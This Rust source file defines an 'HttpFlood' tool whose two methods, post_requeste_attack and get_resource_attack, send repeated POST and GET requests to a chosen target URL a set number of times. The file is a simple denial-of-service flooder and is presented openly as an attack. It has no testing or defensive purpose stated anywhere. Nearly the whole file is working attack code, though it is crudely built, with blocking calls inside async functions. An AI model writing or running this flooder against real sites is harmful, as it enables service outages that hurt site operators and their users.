use std::collections::HashMap;

use reqwest;

// 1. post request in the form
// 2. get resource(html,css,js)
pub struct HttpFlood {
    target_url: String,
    times: u32,
}

impl HttpFlood {
    pub fn new(target_url: String, times: u32) -> Self {
        Self { target_url, times }
    }

    pub async fn post_requeste_attack(
        &self,
        tag: String,
        text: String,
    ) -> Result<(), Box<dyn std::error::Error>> {
        for _ in 0..self.times {
            // Create a reqwest Client
            let client = reqwest::blocking::Client::new();

            // Create a HashMap with the data to be sent in the request body
            let mut data = HashMap::new();
            data.insert(tag.clone(), text.clone());
            // Add more data as needed

            // Send the POST request asynchronously
            let response = client.post(self.target_url.clone()).json(&data).send().unwrap();
            // Check if the request was successful (status code 2xx)
            if response.status().is_success() {
                // Print the response body
                let body = response.text()?;
                println!("Response: {}", body);
            } else {
                // Print an error message if the request was not successful
                println!("Error: {:?}", response);
            }

            println!("creating successed");
        }
        Ok(())
    }

    pub async fn get_resource_attack(&self) {
        for _ in 0..self.times {
            // Create a reqwest Client
            let client = reqwest::blocking::Client::new();

            // Make a GET request to a URL
            let response: Result<reqwest::blocking::Response, reqwest::Error> = client.get(&self.target_url).send();

            // Check if the request was successful
            match response {
                Ok(res) => {
                    if res.status().is_success() {
                        // Read the response body as a string
                        let body = res.text().unwrap();
                        println!("Response body: {}", body);
                    } else {
                        println!("Request failed with status code: {}", res.status());
                    }
                }
                Err(err) => {
                    println!("Error occurred: {}", err);
                }
            }
        }
    }
}
